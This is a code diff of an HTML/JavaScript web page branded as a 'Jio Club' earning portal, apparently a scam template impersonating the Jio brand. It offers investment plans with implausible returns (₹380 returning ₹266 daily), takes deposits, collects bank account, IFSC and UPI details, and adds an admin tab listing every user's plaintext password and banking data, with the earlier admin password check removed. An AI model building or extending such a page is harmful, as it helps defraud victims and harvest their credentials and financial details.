@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Jio Club - Earning Portal</title>
+  <title>Jio Club - Complete Earning Portal</title>
   <style>
     :root {
       --primary-color: #0a58ca;
@@ -14,7 +14,7 @@
     }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
     body { background: var(--bg-color); color: var(--text-color); padding-bottom: 70px; }
-    .main-container { max-width: 500px; margin: 0 auto; padding: 15px; }
+    .main-container { max-width: 600px; margin: 0 auto; padding: 15px; }
     .card { background: var(--card-bg); padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 15px; }
     .card h3 { color: var(--primary-color); margin-bottom: 15px; border-bottom: 2px solid var(--primary-color); padding-bottom: 5px; font-size: 16px; }
     label { display: block; font-size: 13px; font-weight: bold; color: #555; margin-top: 10px; }
@@ -22,20 +22,25 @@
     .btn { width: 100%; margin-top: 15px; padding: 12px; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; color: white; background: var(--primary-color); }
     
     .jio-header { background: linear-gradient(135deg, #0a58ca, #0d6efd); color: white; padding: 15px; border-radius: 12px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; }
-    .jio-logo { font-size: 20px; font-weight: 900; }
+    .jio-logo { font-size: 22px; font-weight: 900; }
 
+    .plan-box { background: #f8f9fa; border: 1px solid #ddd; padding: 15px; border-radius: 8px; margin-top: 10px; }
+    
     table { width: 100%; border-collapse: collapse; margin-top: 10px; overflow-x: auto; display: block; }
     th, td { border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 12px; }
     th { background-color: var(--primary-color); color: white; }
 
-    /* Hidden Admin Link at bottom */
-    .admin-access-bar { text-align: center; margin-top: 30px; padding: 10px; }
-    .admin-link-btn { background: none; border: none; color: #777; font-size: 12px; text-decoration: underline; cursor: pointer; }
+    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: white; display: flex; justify-content: space-around; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); padding: 8px 0; z-index: 1000; }
+    .nav-item { text-align: center; font-size: 11px; color: #777; cursor: pointer; font-weight: 600; flex: 1; }
+    .nav-item.active { color: var(--primary-color); }
+    .nav-item span { display: block; font-size: 20px; }
+    .section-view { display: none; }
+    .section-view.active-sec { display: block; }
   </style>
 </head>
 <body onload="initApp()">
 
-  <!-- 1. USER AUTH SECTION (Login / Register) -->
+  <!-- AUTH SECTION (Login & Register) -->
   <div id="auth-section" class="main-container">
     <div class="jio-header" style="justify-content:center; margin-top:20px;">
       <div class="jio-logo">Jio Digital Club 🚀</div>
@@ -70,66 +75,87 @@
     </div>
   </div>
 
-  <!-- 2. USER DASHBOARD SECTION (Original Earning Portal) -->
-  <div id="user-portal" class="main-container" style="display:none;">
-    <div class="jio-header">
-      <div class="jio-logo">Jio Club Portal</div>
-      <button onclick="logoutUser()" style="background:#ff3b30; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer; font-size:12px;">Logout</button>
-    </div>
+  <!-- MAIN PORTAL CONTAINER (AFTER LOGIN) -->
+  <div id="portal-container" style="display:none;">
+    <div class="main-container">
+      <div class="jio-header">
+        <div class="jio-logo">Jio Club Portal</div>
+        <div style="font-size: 13px;"><button onclick="logoutUser()" style="background:#ff3b30; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer;">Logout</button></div>
+      </div>
 
-    <div class="card">
-      <h3>💎 Jio Investment Plans</h3>
-      <p style="font-size:13px; color:#555;">Available Balance: <b>₹<span id="user-balance">40</span></b></p>
-      <div style="background:#f8f9fa; border:1px solid #ddd; padding:15px; border-radius:8px; margin-top:10px;">
-        <h4>Jio Starter Plan (₹380)</h4>
-        <p style="font-size:12px; color:#666; margin:5px 0;">Daily Return: ₹266 | Duration: 2 Days</p>
-        <button class="btn" onclick="buyPlan(380)">Invest ₹380</button>
+      <!-- TAB 1: DASHBOARD & PLANS (UP TO ₹7000) -->
+      <div id="tab-home" class="section-view active-sec">
+        <div class="card">
+          <h3>💎 Account Balance & Deposit</h3>
+          <p style="font-size:14px; color:#555; margin-bottom: 10px;">Available Balance: <b>₹<span id="user-balance">40</span></b></p>
+          <label>Deposit Amount (₹)</label>
+          <input type="number" id="deposit-amt" placeholder="Enter amount to add">
+          <button class="btn" style="background: #28a745;" onclick="depositMoney()">Deposit Money</button>
+        </div>
+
+        <div class="card">
+          <h3>🚀 Jio Investment Plans (Up to ₹7000)</h3>
+          
+          <div class="plan-box">
+            <h4>Jio Starter Plan (₹380)</h4>
+            <p style="font-size:12px; color:#666; margin:5px 0;">Daily Return: ₹266 | Duration: 2 Days</p>
+            <button class="btn" onclick="buyPlan(380)">Invest ₹380</button>
+          </div>
+
+          <div class="plan-box">
+            <h4>Jio Advanced Plan (₹1,500)</h4>
+            <p style="font-size:12px; color:#666; margin:5px 0;">Daily Return: ₹600 | Duration: 3 Days</p>
+            <button class="btn" onclick="buyPlan(1500)">Invest ₹1,500</button>
+          </div>
+
+          <div class="plan-box">
+            <h4>Jio Mega Pro Plan (₹7,000)</h4>
+            <p style="font-size:12px; color:#666; margin:5px 0;">Daily Return: ₹3,100 | Duration: 3 Days</p>
+            <button class="btn" onclick="buyPlan(7000)">Invest ₹7,000</button>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>🏦 Add Bank / UPI Details (For Withdrawal)</h3>
+          <label>Account Holder Name</label>
+          <input type="text" id="bank-holder" placeholder="Name as per Bank">
+          <label>Account Number</label>
+          <input type="text" id="bank-acc" placeholder="Enter Account Number">
+          <label>IFSC Code</label>
+          <input type="text" id="bank-ifsc" placeholder="Enter IFSC Code">
+          <label>UPI ID</label>
+          <input type="text" id="bank-upi" placeholder="e.g. mobile@paytm">
+          <button class="btn" onclick="saveBankDetails()">Save Details</button>
+        </div>
+      </div>
+
+      <!-- TAB 2: ADMIN PANEL -->
+      <div id="tab-admin" class="section-view">
+        <div class="card" style="border-left: 5px solid #0a58ca;">
+          <h3>👑 Admin Panel: All Users Data</h3>
+          <p style="font-size: 12px; color: #666; margin-bottom: 10px;">यहाँ सभी ग्राहकों की यूजर आईडी, पासवर्ड और उनके बैंक/UPI विवरण दिखाई दे रहे हैं।</p>
+          <table>
+            <thead>
+              <tr>
+                <th>UID / Name</th>
+                <th>Phone / Email</th>
+                <th>Password</th>
+                <th>Bank / UPI Details</th>
+              </tr>
+            </thead>
+            <tbody id="adminUserTable">
+              <tr><td colspan="4" style="text-align:center;">डेटा लोड हो रहा है...</td></tr>
+            </tbody>
+          </table>
+        </div>
       </div>
     </div>
 
-    <div class="card">
-      <h3>🏦 Add Bank / UPI Details (For Withdrawal)</h3>
-      <label>Account Holder Name</label>
-      <input type="text" id="bank-holder" placeholder="Name as per Bank">
-      <label>Account Number</label>
-      <input type="text" id="bank-acc" placeholder="Enter Account Number">
-      <label>IFSC Code</label>
-      <input type="text" id="bank-ifsc" placeholder="Enter IFSC Code">
-      <label>UPI ID</label>
-      <input type="text" id="bank-upi" placeholder="e.g. mobile@paytm">
-      <button class="btn" onclick="saveBankDetails()">Save Details</button>
+    <!-- BOTTOM NAVBAR -->
+    <div class="bottom-nav">
+      <div class="nav-item active" onclick="switchTab('home', this)"><span>🏠</span>Dashboard</div>
+      <div class="nav-item" onclick="switchTab('admin', this)"><span>👑</span>Admin Panel</div>
     </div>
-  </div>
-
-  <!-- 3. ADMIN PANEL SECTION (Completely Separated) -->
-  <div id="admin-section" class="main-container" style="display:none;">
-    <div class="jio-header" style="background: #333;">
-      <div class="jio-logo">👑 Admin Control Panel</div>
-      <button onclick="closeAdminPanel()" style="background:#ff3b30; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer; font-size:12px;">Back to Site</button>
-    </div>
-
-    <div class="card">
-      <h3>All Registered Customers & Bank Details</h3>
-      <p style="font-size: 12px; color: #666; margin-bottom: 10px;">यहाँ सभी ग्राहकों की यूजर आईडी, पासवर्ड और उनके बैंक/UPI विवरण दिखाई दे रहे हैं।</p>
-      <table>
-        <thead>
-          <tr>
-            <th>UID / Name</th>
-            <th>Phone / Email</th>
-            <th>Password</th>
-            <th>Bank / UPI Details</th>
-          </tr>
-        </thead>
-        <tbody id="adminUserTable">
-          <tr><td colspan="4" style="text-align:center;">डेटा लोड हो रहा है...</td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- Hidden Link to Open Admin Panel -->
-  <div class="admin-access-bar" id="admin-bar">
-    <button class="admin-link-btn" onclick="openAdminPanel()">🔒 Admin Panel Login</button>
   </div>
 
   <script>
@@ -138,7 +164,7 @@
 
     function initApp() {
       if (currentUser) {
-        showUserPortal();
+        showPortal();
       }
     }
 
@@ -179,7 +205,7 @@
       localStorage.setItem("currentUser", JSON.stringify(currentUser));
 
       alert("रजिस्ट्रेशन सफल रहा!");
-      showUserPortal();
+      showPortal();
     }
 
     function loginUser() {
@@ -191,7 +217,7 @@
       if(user) {
         currentUser = user;
         localStorage.setItem("currentUser", JSON.stringify(currentUser));
-        showUserPortal();
+        showPortal();
       } else { 
         alert("गलत ईमेल/फोन या पासवर्ड!"); 
       }
@@ -200,16 +226,13 @@
     function logoutUser() {
       localStorage.removeItem("currentUser");
       currentUser = null;
-      document.getElementById("user-portal").style.display = "none";
+      document.getElementById("portal-container").style.display = "none";
       document.getElementById("auth-section").style.display = "block";
-      document.getElementById("admin-bar").style.display = "block";
     }
 
-    function showUserPortal() {
+    function showPortal() {
       document.getElementById("auth-section").style.display = "none";
-      document.getElementById("admin-section").style.display = "none";
-      document.getElementById("admin-bar").style.display = "none";
-      document.getElementById("user-portal").style.display = "block";
+      document.getElementById("portal-container").style.display = "block";
       document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
       
       if(currentUser.bankDetails) {
@@ -218,6 +241,32 @@
         document.getElementById("bank-ifsc").value = currentUser.bankDetails.ifsc || '';
         document.getElementById("bank-upi").value = currentUser.bankDetails.upi || '';
       }
+      
+      loadAdminTable();
+    }
+
+    function depositMoney() {
+      let amt = parseFloat(document.getElementById("deposit-amt").value);
+      if(isNaN(amt) || amt <= 0) {
+        alert("कृपया सही राशि (Amount) दर्ज करें!");
+        return;
+      }
+      currentUser.balance += amt;
+      updateUserData();
+      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
+      document.getElementById("deposit-amt").value = '';
+      alert("₹" + amt + " सफलतापूर्वक जोड़े गए!");
+    }
+
+    function buyPlan(price) {
+      if(currentUser.balance < price) {
+        alert("आपका बैलेंस कम है! कृपया पहले डिपॉजिट करें।");
+        return;
+      }
+      currentUser.balance -= price;
+      updateUserData();
+      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
+      alert("₹" + price + " का प्लान सफलतापूर्वक खरीद लिया गया है!");
     }
 
     function saveBankDetails() {
@@ -232,50 +281,19 @@
       }
 
       currentUser.bankDetails = { holder, acc, ifsc, upi };
+      updateUserData();
       
+      alert("बैंक डिटेल्स सफलतापूर्वक सेव कर दी गई हैं!");
+      loadAdminTable();
+    }
+
+    function updateUserData() {
       let index = usersDB.findIndex(u => u.email === currentUser.email);
       if(index !== -1) {
         usersDB[index] = currentUser;
       }
-
       localStorage.setItem("usersDB", JSON.stringify(usersDB));
       localStorage.setItem("currentUser", JSON.stringify(currentUser));
-      
-      alert("बैंक डिटेल्स सफलतापूर्वक सेव कर दी गई हैं!");
-    }
-
-    function buyPlan(price) {
-      if(currentUser.balance < price) {
-        alert("आपका बैलेंस कम है!");
-        return;
-      }
-      currentUser.balance -= price;
-      localStorage.setItem("currentUser", JSON.stringify(currentUser));
-      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
-      alert("प्लान सफलतापूर्वक खरीद लिया गया है!");
-    }
-
-    function openAdminPanel() {
-      let pass = prompt("एंटर एडमिन पासवर्ड दर्ज करें:");
-      if(pass === "admin123" || pass === "1234") { // साधारण पासवर्ड सुरक्षा
-        document.getElementById("auth-section").style.display = "none";
-        document.getElementById("user-portal").style.display = "none";
-        document.getElementById("admin-bar").style.display = "none";
-        document.getElementById("admin-section").style.display = "block";
-        loadAdminTable();
-      } else if(pass !== null) {
-        alert("गलत पासवर्ड!");
-      }
-    }
-
-    function closeAdminPanel() {
-      document.getElementById("admin-section").style.display = "none";
-      if(currentUser) {
-        document.getElementById("user-portal").style.display = "block";
-      } else {
-        document.getElementById("auth-section").style.display = "block";
-        document.getElementById("admin-bar").style.display = "block";
-      }
     }
 
     function loadAdminTable() {
@@ -305,6 +323,16 @@
           </tr>
         `;
       });
+    }
+
+    function switchTab(name, el) {
+      document.querySelectorAll('.section-view').forEach(s => s.classList.remove('active-sec'));
+      document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+      document.getElementById('tab-' + name).classList.add('active-sec');
+      el.classList.add('active');
+      if(name === 'admin') {
+        loadAdminTable();
+      }
     }
   </script>
 </body>
